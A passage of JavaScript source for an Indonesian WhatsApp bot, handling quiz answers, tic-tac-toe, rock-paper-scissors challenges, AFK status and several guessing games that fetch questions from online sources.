} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (asahotak.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = asahotak[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'asahotak', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Asah Otak🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete asahotak[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (tebakbendera.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = tebakbendera[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'tebakbendera', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Tebak Bendera🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakbendera[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = tebakkabupaten[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'tebakkabupaten', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Tebak Kabupaten🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakkabupaten[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*??🇵 : 間違った答え*_')
}

if (tekateki.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = tekateki[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'tekateki', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Teka Teki🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tekateki[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (susunkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = susunkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'susunkata', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Susun Kata🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete susunkata[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (tebakanime.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = tebakanime[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'tebakanime', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Tebak Anime🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakanime[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (tebakaplikasi.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = tebakaplikasi[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'tebakaplikasi', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Tebak Aplikasi 🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakaplikasi[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (tebakwaifu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = tebakwaifu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'tebakwaifu', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Tebak Waifu🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakwaifu[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

if (tebakjenaka.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
ez = Math.ceil(Math.random() * 450)
b = randomNomor(500)
addBalance(sender, b, balance)
addLevelingXp(sender, ez)
jawaban = tebakjenaka[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await Dani.sendButtonText(m.chat, [{ buttonId: 'tebakjenaka', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `🎮 Tebak Jenaka🎮\n\nJawaban Benar 🎉\n\nBonus :\n• Uang : $${b}\n• Xp : ${ez}\nIngin bermain lagi? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakjenaka[m.sender.split('@')[0]]
} else m.reply('_*🇬🇧 : Wrong answer*_\n_*🇮🇩 : Jawaban Salah*_\n_*🇯🇵 : 間違った答え*_')
}

//TicTacToe
this.game = this.game ? this.game : {}
let room = Object.values(this.game).find(room => room.id && room.game && room.state && room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender) && room.state == 'PLAYING')
if (room) {
let ok
let isWin = !1
let isTie = !1
let isSurrender = !1
// m.reply(`[DEBUG]\n${parseInt(m.text)}`)
if (!/^([1-9]|(me)?nyerah|surr?ender|off|skip)$/i.test(m.text)) return
isSurrender = !/^[1-9]$/.test(m.text)
if (m.sender !== room.game.currentTurn) { // nek wayahku
if (!isSurrender) return !0
}
if (!isSurrender && 1 > (ok = room.game.turn(m.sender === room.game.playerO, parseInt(m.text) - 1))) {
m.reply({
'-3': 'Game telah berakhir',
'-2': 'Invalid',
'-1': 'Posisi Invalid',
0: 'Posisi Invalid',
}[ok])
return !0
}
if (m.sender === room.game.winner) isWin = true
else if (room.game.board === 511) isTie = true
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
if (isSurrender) {
room.game._currentTurn = m.sender === room.game.playerX
isWin = true
}
let winner = isSurrender ? room.game.currentTurn : room.game.winner
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Menang!` : isTie ? `Game berakhir` : `Giliran ${['❌', '⭕'][1 * room.game._currentTurn]} (@${room.game.currentTurn.split('@')[0]})`}
❌: @${room.game.playerX.split('@')[0]}
⭕: @${room.game.playerO.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if ((room.game._currentTurn ^ isSurrender ? room.x : room.o) !== m.chat)
room[room.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
if (room.x !== room.o) await Dani.sendText(room.x, str, m, { mentions: parseMention(str) } )
await Dani.sendText(room.o, str, m, { mentions: parseMention(str) } )
if (isTie || isWin) {
delete this.game[room.id]
}
}

//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
Dani.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
Dani.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) Dani.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) Dani.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) Dani.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
Dani.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) Dani.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
m.reply(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) Dani.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
Dani.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}

@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`
Jangan tag dia!
Dia sedang AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}

if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
m.reply(`
Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

switch(command) {
case 'afk': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${m.pushName} Telah Afk${text ? ': ' + text : ''}`)
}
break	
case 'ttc': case 'ttt': case 'tictactoe': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await Dani.sendText(room.x, str, m, { mentions: parseMention(str) } )
await Dani.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
case 'delttc': case 'delttt': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
this.game = this.game ? this.game : {}
try {
if (this.game) {
delete this.game
Dani.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
} else if (!this.game) {
m.reply(`Session TicTacToe🎮 tidak ada`)
} else throw '?'
} catch (e) {
m.reply('rusak')
}
}
break
case 'suitpvp': case 'suit': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await Dani.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) Dani.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break    
case 'runtime': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
m.reply(`DANI BOT AKTIF SELAMA : ${runtime(process.uptime())}`)
}
break
case 'chat': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!isCreator) return sticOwner(from)
if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
if (args[0] === 'mute') {
Dani.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unmute') {
Dani.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'archive') {
Dani.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unarchive') {
Dani.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'read') {
Dani.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'unread') {
Dani.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'delete') {
Dani.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
}
break
case 'family100': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if ('family100'+m.chat in _family100) {
m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `「 *FAMILY 100* 」\n\n❏ *Soal* :\n${random.soal}\n\n❏ *Total Jawaban* : ${random.jawaban.length} ❏ *J a w a b a n* ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await Dani.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
}
}
break
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
}
break
case 'tebaklagu': {                
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let result = await fetchJson(`${webdani}/api/entertainment/tebaklagu?apikey=${daniapi}`)
let msg = await Dani.sendMessage(m.chat, { audio: { url: result.result.link_song }, mimetype: 'audio/mpeg' }, { quoted: freply })
Dani.sendText(m.chat, `「 *TEBAK LAGU* 」\n\n❏ *Artist* : ${result.result.artist}\n❏ *Petunjuk* : ${result.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.result.jawaban)
Dani.sendButtonText(m.chat, [{ buttonId: 'tebaklagu', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${tebaklagu[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, m)
delete tebaklagu[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}
}
break
case 'tebakgambar': {              
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let result = await fetchJson(`${webdani}/api/entertainment/tebakgambar?apikey=${daniapi}`)
Dani.sendImage(m.chat, result.result.pertanyaan, `「 *TEBAK GAMBAR* 」\n\n❏ *Petunjuk* : ${result.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.result.jawaban)
Dani.sendButtonText(m.chat, [{ buttonId: 'tebakgambar', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${tebakgambar[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakgambar[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}                 
}
break
case 'tebakkabupaten': {          
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let result = await fetchJson(`${webdani}/api/entertainment/tebakkabupaten?apikey=${daniapi}`)
Dani.sendImage(m.chat, result.result.pertanyaan, `「 *TEBAK KABUPATEN* 」\n\n❏ *Petunjuk* : ${result.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
tebakkabupaten[m.sender.split('@')[0]] = result.result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.result.jawaban)
Dani.sendButtonText(m.chat, [{ buttonId: 'tebakkabupaten', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${tebakkabupaten[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakkabupaten[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}                 
}
break
case 'tebakanime': {               
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (tebakanime.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let result = await fetchJson(`${webdani}/api/entertainment/tebakanime?apikey=${daniapi}`)                   
Dani.sendImage(m.chat, result.image, `「 *TEBAK ANIME* 」\n\n❏ *Deskripsi* : ${result.deskripsi}\n❏ *Petunjuk* : ${result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
tebakanime[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakanime.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
Dani.sendButtonText(m.chat, [{ buttonId: 'tebakanime', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${tebakanime[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakanime[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}                 
}
break
case 'tebakaplikasi': {                
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (tebakaplikasi.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let result = await fetchJson(`${webdani}/api/entertainment/tebakaplikasi?apikey=${daniapi}`)                   
Dani.sendImage(m.chat, result.image, `「 *TEBAK APLIKASI* 」\n\n❏ *Petunjuk* : ${result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
tebakaplikasi[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakaplikasi.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
Dani.sendButtonText(m.chat, [{ buttonId: 'tebakaplikasi', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${tebakaplikasi[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakaplikasi[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}                 
}
break
case 'tebakwaifu': {                
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (tebakwaifu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson(`${webdani}/api/entertainment/tebakwaifu?apikey=${daniapi}`)                   
Dani.sendImage(m.chat, anu.result.image, `「 *TEBAK WAIFU* 」\n\n❏ *Petunjuk* : ${anu.result.name.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
tebakwaifu[m.sender.split('@')[0]] = anu.result.name.toLowerCase()
})
await sleep(60000)
if (tebakwaifu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + anu.result.name)
Dani.sendButtonText(m.chat, [{ buttonId: 'tebakwaifu', buttonText: { displayText: '➡️ NEXT' }, type: 1 }], `「 *WAKTU HABIS* 」\n❏ *Jawaban* :  ${tebakwaifu[m.sender.split('@')[0]]}\n❏ *Note* : Jika Belum Bisa Belajar Dulu Dek\n\nIngin bermain? tekan button dibawah`, `Made With 🤍 Dani | Copyright 2022`, freply)
delete tebakwaifu[m.sender.split('@')[0]]
gameAdd(sender, glimit)
}                 
}
break
case 'tebakkata': {
addCountCmd(`#${command.slice(0)}`, sender, _cmd)
if (isBan) return sticBan(from)
if (isGame(sender, isCreator, isPremium, gcount, glimit)) return m.reply(`Limit game kamu sudah habis`)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let result = await fetchJson(`${webdani}/api/entertainment/tebakkata?apikey=${daniapi}`)
Dani.sendText(m.chat, `「 *TEBAK KATA* 」\n\n❏ *Soal* : ${result.result.soal}\n❏ *Petunjuk* : ${result.result.jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')}\n❏ *Waktu* : 60s`, freply).then(() => {
tebakkata[m.sender.split('@')[0]] = result.result.jawaban.toLowerCase()
})
await sleep(60000)
